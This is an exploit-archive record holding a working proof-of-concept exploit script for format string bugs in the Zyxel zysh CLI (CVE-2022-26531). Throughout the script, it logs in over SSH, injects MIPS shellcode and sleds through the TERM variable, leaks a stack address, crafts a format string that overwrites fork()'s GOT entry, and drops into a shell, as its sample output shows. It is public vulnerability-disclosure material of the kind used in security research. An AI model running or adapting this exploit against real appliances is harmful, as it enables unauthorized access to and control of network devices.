{"source": "https://www.exploit-db.com/exploits/51786", "vulnName": "Zyxel zysh - Format string", "vulnEDBID": "51786", "vulnCVE": "N/A", "author": "MARCO IVALDI", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-02-09", "vulnContent": "#!/usr/bin/expect -f\n\n#\n# raptor_zysh_fhtagn.exp - zysh format string PoC exploit\n# Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>\n#\n# \"We live on a placid island of ignorance in the midst of black seas of\n# infinity, and it was not meant that we should voyage far.\"\n#                                -- H. P. Lovecraft, The Call of Cthulhu\n#\n# \"Multiple improper input validation flaws were identified in some CLI\n# commands of Zyxel USG/ZyWALL series firmware versions 4.09 through 4.71,\n# USG FLEX series firmware versions 4.50 through 5.21, ATP series firmware\n# versions 4.32 through 5.21, VPN series firmware versions 4.30 through\n# 5.21, NSG series firmware versions 1.00 through 1.33 Patch 4, NXC2500\n# firmware version 6.10(AAIG.3) and earlier versions, NAP203 firmware\n# version 6.25(ABFA.7) and earlier versions, NWA50AX firmware version\n# 6.25(ABYW.5) and earlier versions, WAC500 firmware version 6.30(ABVS.2)\n# and earlier versions, and WAX510D firmware version 6.30(ABTF.2) and\n# earlier versions, that could allow a local authenticated attacker to\n# cause a buffer overflow or a system crash via a crafted payload.\"\n#                                -- CVE-2022-26531\n#\n# The zysh binary is a restricted shell that implements the command-line\n# interface (CLI) on multiple Zyxel products. This proof-of-concept exploit\n# demonstrates how to leverage the format string bugs I have identified in\n# the \"extension\" argument of some zysh commands, to execute arbitrary code\n# and escape the restricted shell environment.\n#\n# - This exploit targets the \"ping\" zysh command.\n# - It overwrites the .got entry of fork() with the shellcode address.\n# - The shellcode address is calculated based on a leaked stack address.\n# - Hardcoded offsets and values might need some tweaking, see comments.\n# - Automation/weaponization for other targets is left as an exercise.\n#\n# For additional details on my bug hunting journey and on the\n# vulnerabilities themselves, you can refer to the official advisory:\n# https://github.com/0xdea/advisories/blob/master/HNS-2022-02-zyxel-zysh.txt\n#\n# Usage:\n# raptor@blumenkraft ~ % ./raptor_zysh_fhtagn.exp <REDACTED> admin password\n# raptor_zysh_fhtagn.exp - zysh format string PoC exploit\n# Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>\n# \n# Leaked stack address:  0x7fe97170\n# Shellcode address:     0x7fe9de40\n# Base string length:    46\n# Hostile format string: %.18u%1801$n%.169u%1801$hn%.150u%1801$hhn%.95u%1802$hhn\n# \n# *** enjoy your shell! ***\n# \n# sh-5.1$ uname -snrmp\n# Linux USG20-VPN 3.10.87-rt80-Cavium-Octeon mips64 Cavium Octeon III V0.2 FPU V0.0\n# sh-5.1$ id\n# uid=10007(admin) gid=10000(operator) groups=10000(operator)\n#\n# Tested on:\n# Zyxel USG20-VPN with Firmware 5.10 \n# [other appliances/versions are also likely vulnerable]\n#\n\n# change string encoding to 8-bit ASCII to avoid annoying conversion to UTF-8\nencoding system iso8859-1\n\n# hostile format string to leak stack address via direct parameter access\nset offset1 77\nset leak [format \"AAAA.0x%%%d\\$x\" $offset1]\n\n# offsets to reach addresses in retloc sled via direct parameter access\nset offset2 1801\nset offset3 [expr $offset2 + 1]\n\n# difference between leaked stack address and shellcode address\nset diff 27856\n\n# retloc sled\n# $ mips64-linux-readelf -a zysh | grep JUMP | grep fork\n# 112dd558  0000967f R_MIPS_JUMP_SLOT  00000000   fork@GLIBC_2.0\n# ^^^^^^^^ << this is the address we need to encode: [112dd558][112dd558][112dd558+2][112dd558+2]\nset retloc [string repeat \"\\x11\\x2d\\xd5\\x58\\x11\\x2d\\xd5\\x58\\x11\\x2d\\xd5\\x5a\\x11\\x2d\\xd5\\x5a\" 1024]\n\n# nop sled\n# nop-equivalent instruction: xor $t0, $t0, $t0\nset nops [string repeat \"\\x01\\x8c\\x60\\x26\" 64]\n\n# shellcode\n# https://github.com/0xdea/shellcode/blob/main/MIPS/mips_n32_msb_linux_revsh.c\nset sc \"\\x3c\\x0c\\x2f\\x62\\x25\\x8c\\x69\\x6e\\xaf\\xac\\xff\\xec\\x3c\\x0c\\x2f\\x73\\x25\\x8c\\x68\\x68\\xaf\\xac\\xff\\xf0\\xa3\\xa0\\xff\\xf3\\x27\\xa4\\xff\\xec\\xaf\\xa4\\xff\\xf8\\xaf\\xa0\\xff\\xfc\\x27\\xa5\\xff\\xf8\\x28\\x06\\xff\\xff\\x24\\x02\\x17\\xa9\\x01\\x01\\x01\\x0c\"\n\n# padding to align payload in memory (might need adjusting)\nset padding \"AAA\"\n\n# print header\nsend_user \"raptor_zysh_fhtagn.exp - zysh format string PoC exploit\\n\"\nsend_user \"Copyright (c) 2022 Marco Ivaldi <raptor@0xdeadbeef.info>\\n\\n\"\n\n# check command line\nif { [llength $argv] != 3} {\n send_error \"usage: ./raptor_zysh_fhtagn.exp <host> <user> <pass>\\n\"\n exit 1\n}\n\n# get SSH connection parameters\nset port \"22\"\nset host [lindex $argv 0]\nset user [lindex $argv 1]\nset pass [lindex $argv 2]\n\n# inject payload via the TERM environment variable\nset env(TERM) $retloc$nops$sc$padding\n\n# connect to target via SSH\nlog_user 0\nspawn -noecho ssh -q -o StrictHostKeyChecking=no -p $port $host -l $user\nexpect {\n -nocase \"password*\" {\n  send \"$pass\\r\"\n }\n default {\n  send_error \"error: could not connect to ssh\\n\"\n  exit 1\n }\n}\n\n# leak stack address\nexpect {\n \"Router? $\" {\n  send \"ping 127.0.0.1 extension $leak\\r\"\n }\n default {\n  send_error \"error: could not access zysh prompt\\n\"\n  exit 1\n }\n}\nexpect {\n -re \"ping: unknown host AAAA\\.(0x.*)\\r\\n\" {\n }\n default {\n  send_error \"error: could not leak stack address\\n\"\n  exit 1\n }\n}\nset leaked $expect_out(1,string)\nsend_user \"Leaked stack address:\\t$leaked\\n\"\n\n# calculate shellcode address\nset retval [expr $leaked + $diff]\nset retval [format 0x%x $retval]\nsend_user \"Shellcode address:\\t$retval\\n\"\n\n# extract each byte of shellcode address\nset b1 [expr ($retval & 0xff000000) >> 24]\nset b2 [expr ($retval & 0x00ff0000) >> 16]\nset b3 [expr ($retval & 0x0000ff00) >> 8]\nset b4 [expr ($retval & 0x000000ff)]\nset b1 [format 0x%x $b1]\nset b2 [format 0x%x $b2]\nset b3 [format 0x%x $b3]\nset b4 [format 0x%x $b4]\n\n# calculate numeric arguments for the hostile format string\nset base [string length \"/bin/zysudo.suid /bin/ping 127.0.0.1 -n -c 3  \"]\nsend_user \"Base string length:\\t$base\\n\"\nset n1 [expr ($b4 - $base) % 0x100]\nset n2 [expr ($b2 - $b4) % 0x100]\nset n3 [expr ($b1 - $b2) % 0x100]\nset n4 [expr ($b3 - $b1) % 0x100]\n\n# check for dangerous numeric arguments below 10\nif {$n1 < 10} { incr n1 0x100 }\nif {$n2 < 10} { incr n2 0x100 }\nif {$n3 < 10} { incr n3 0x100 }\nif {$n4 < 10} { incr n4 0x100 }\n\n# craft the hostile format string\nset exploit [format \"%%.%du%%$offset2\\$n%%.%du%%$offset2\\$hn%%.%du%%$offset2\\$hhn%%.%du%%$offset3\\$hhn\" $n1 $n2 $n3 $n4]\nsend_user \"Hostile format string:\\t$exploit\\n\\n\"\n\n# uncomment to debug\n# interact +\n\n# exploit target\nset prompt \"(#|\\\\\\$) $\"\nexpect {\n \"Router? $\" {\n  send \"ping 127.0.0.1 extension $exploit\\r\"\n }\n default {\n  send_error \"error: could not access zysh prompt\\n\"\n  exit 1\n }\n}\nexpect {\n \"Router? $\" {\n  send_error \"error: could not exploit target\\n\"\n  exit 1\n }\n -re $prompt {\n  send_user \"*** enjoy your shell! ***\\n\"\n  send \"\\r\"\n  interact\n }\n default {\n  send_error \"error: could not exploit target\\n\"\n  exit 1\n }\n}\n            "}